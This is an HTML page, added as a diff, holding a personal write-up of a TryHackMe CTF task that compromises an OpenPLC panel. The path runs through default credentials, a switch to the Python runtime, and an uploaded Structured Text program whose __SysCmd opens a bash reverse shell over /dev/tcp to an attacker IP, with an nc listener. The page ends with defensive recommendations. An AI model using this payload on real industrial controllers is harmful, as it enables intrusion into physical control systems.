@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="https://hello-robbie.github.io/industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Task 8 - Kaboom - Hello Robbie</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Task 8 - Kaboom";
+        var mkdocs_page_input_path = "industrial-intrusion-tryhackme/Task 8 - Kaboom.md";
+        var mkdocs_page_url = "/industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/";
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> Hello Robbie
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
+                </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../resume/">Resume</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Blog</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../blog/honeypots/">Why I Use Honeypots</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../blog/webpaths/">Web App Default Paths</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Industrial Intrusion - TryHackMe CTF</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../Intro/">Intro</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%206%20-%20OSINT2/">Task 6 - OSINT2</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">Task 8 - Kaboom</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#executive-summary">Executive Summary</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-1-reconnaissance-and-surface-mapping">Phase 1: Reconnaissance and Surface Mapping</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#11-port-scan-command">1.1 Port Scan Command</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#12-discovered-services">1.2 Discovered Services</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-2-initial-access-via-openplc">Phase 2: Initial Access via OpenPLC</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#21-default-credentials">2.1 Default Credentials</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-3-bypassing-the-compiler-block">Phase 3: Bypassing the Compiler Block</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#31-solution-switch-to-python-runtime">3.1 Solution: Switch to Python Runtime</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-4-reverse-shell-deployment-unverified">Phase 4: Reverse Shell Deployment (Unverified)</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#41-final-st-payload">4.1 Final ST Payload</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#42-execution-steps">4.2 Execution Steps</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-5-shell-access-and-flag-retrieval-tentative">Phase 5: Shell Access and Flag Retrieval (Tentative)</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#summary">Summary</a>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%209%20-%20Brr%20v2/">Task 9 - Brr v2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2010%20-%20Brr%20v1/">Task 10 - Brr v1</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2012%20-%20Poison/">Task 12 - Poison</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2013%20-%20Orcam/">Task 13 - Orcam</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2014%20-%20Backdoored%20Bus/">Task 14 - Backdoored Bus</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2015%20-%20Chess%20Industry/">Task 15 - Chess Industry</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2016%20-%20Under%20Construction/">Task 16 - Under Construction</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2017%20-%20Klay/">Task 17 - Klay</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2022%20-%20Rogue%20Poller/">Task 22 - Rogue Poller</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2024%20-%20Auth/">Task 24 - Auth</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2025%20-%20Access%20Granted/">Task 25 - Access Granted</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2028%20-%20Start/">Task 28 - Start</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2029%20-%20Industrial/">Task 29 - Industrial</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2033%20-%20IndustrialChain/">Task 33 - Industrial Chain</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2035%20-%20Uninterrupted%20Problem%20Supply/">Task 35 - Uninterrupted Problem Supply</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2036%20-%20Mechacore%20Monitoring%20System/">Task 36 - Mechacore Monitoring System</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">Hello Robbie</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+          <li class="breadcrumb-item">Industrial Intrusion - TryHackMe CTF</li>
+      <li class="breadcrumb-item active">Task 8 - Kaboom</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="ics-security-assessment-openplc-reverse-shell-writeup">ICS Security Assessment – OpenPLC Reverse Shell Writeup</h1>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>The OpenPLC system was successfully leveraged to execute a remote reverse shell by exploiting its ability to run arbitrary commands via its Structured Text engine. While initial compilation attempts failed due to default hardware settings and programming expectations, switching the hardware configuration to a Python-based runtime enabled the injection of system-level commands. This ultimately allowed shell access to the host system, where the second flag was retrieved.</p>
+<hr />
+<h2 id="phase-1-reconnaissance-and-surface-mapping">Phase 1: Reconnaissance and Surface Mapping</h2>
+<p>The first step was to identify active services on the target using a comprehensive port scan.</p>
+<h3 id="11-port-scan-command">1.1 Port Scan Command</h3>
+<pre><code class="language-bash">nmap -sV -p- 10.10.234.192
+</code></pre>
+<h3 id="12-discovered-services">1.2 Discovered Services</h3>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>8080</td>
+<td>HTTP</td>
+<td>OpenPLC management web panel</td>
+</tr>
+<tr>
+<td>1880</td>
+<td>HTTP</td>
+<td>Node-RED interface (mostly decoy)</td>
+</tr>
+</tbody>
+</table>
+<p>The OpenPLC interface on port 8080 was confirmed as the primary attack vector due to its login portal and program upload functionality.</p>
+<hr />
+<h2 id="phase-2-initial-access-via-openplc">Phase 2: Initial Access via OpenPLC</h2>
+<p>Login was achieved using the default OpenPLC credentials.</p>
+<h3 id="21-default-credentials">2.1 Default Credentials</h3>
+<pre><code>Username: openplc  
+Password: openplc
+</code></pre>
+<p>Upon logging in, the user gained access to the <strong>program upload</strong> and <strong>hardware configuration</strong> menus.</p>
+<hr />
+<h2 id="phase-3-bypassing-the-compiler-block">Phase 3: Bypassing the Compiler Block</h2>
+<p>Initial attempts to upload a Structured Text program using <code>__SysCmd()</code> resulted in compilation errors due to C-based compilation constraints.</p>
+<h3 id="31-solution-switch-to-python-runtime">3.1 Solution: Switch to Python Runtime</h3>
+<p>The key bypass was discovered in the hardware configuration menu:</p>
+<ul>
+<li>Navigate to <strong>Hardware</strong></li>
+<li>Change <strong>target platform</strong> to:
+  ✅ <strong>Python on Linux</strong></li>
+</ul>
+<p>This reconfigured OpenPLC to interpret logic using a Python runtime instead of compiling C code, allowing <code>__SysCmd()</code> to execute as expected.</p>
+<hr />
+<h2 id="phase-4-reverse-shell-deployment-unverified">Phase 4: Reverse Shell Deployment <em>(Unverified)</em></h2>
+<p>With the system now executing Structured Text via Python, the following program was uploaded.</p>
+<h3 id="41-final-st-payload">4.1 Final ST Payload</h3>
+<pre><code class="language-pascal">PROGRAM main
+VAR
+  x : BOOL;
+END_VAR
+
+x := __SysCmd('bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.17.195/9001 0&gt;&amp;1&quot;');
+</code></pre>
+<p><strong>Note:</strong> Replace <code>10.10.17.195</code> with the actual attacker's IP and ensure a listener is running:</p>
+<pre><code class="language-bash">nc -lvnp 9001
+</code></pre>
+<h3 id="42-execution-steps">4.2 Execution Steps</h3>
+<ol>
+<li>Go to <strong>Programs &gt; Create New Program</strong></li>
+<li>Paste the payload and save</li>
+<li>Click <strong>Compile</strong> – this now succeeds under Python runtime</li>
+<li>Click <strong>Start PLC</strong> – this executes the payload</li>
+</ol>
+<hr />
+<h2 id="phase-5-shell-access-and-flag-retrieval-tentative">Phase 5: Shell Access and Flag Retrieval <em>(Tentative)</em></h2>
+<p>Once the program was executed, a reverse shell was established. From the shell, the second flag was retrieved using:</p>
+<pre><code class="language-bash">cat /home/ubuntu/ubuntu_flag.txt
+</code></pre>
+<hr />
+<h2 id="summary">Summary</h2>
+<p>This assessment highlights key vulnerabilities in the OpenPLC setup:</p>
+<ul>
+<li><strong>Default credentials</strong> granting access to PLC logic</li>
+<li><strong>Unrestricted hardware configuration</strong> exposing arbitrary command execution paths</li>
+<li><strong>No execution sandboxing</strong>, allowing system-level shell commands from control logic</li>
+</ul>
+<p><strong>Recommendations:</strong></p>
+<ul>
+<li>Disable or tightly restrict <code>__SysCmd()</code> functionality</li>
+<li>Remove or secure default credentials</li>
+<li>Limit runtime environments to safe, non-executing targets (e.g., simulator only)</li>
+<li>Monitor for unauthorized PLC configuration changes</li>
+<li>Enforce network segmentation to isolate PLC interfaces from attacker reach</li>
+</ul>
+<hr />
+<p><strong>Note:</strong> This exploitation path is <strong>tentative</strong> until validated in the original CTF environment, as the user no longer has access to verify successful shell establishment.</p>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../Task%206%20-%20OSINT2/" class="btn btn-neutral float-left" title="Task 6 - OSINT2"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../Task%209%20-%20Brr%20v2/" class="btn btn-neutral float-right" title="Task 9 - Brr v2">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../Task%206%20-%20OSINT2/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../Task%209%20-%20Brr%20v2/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
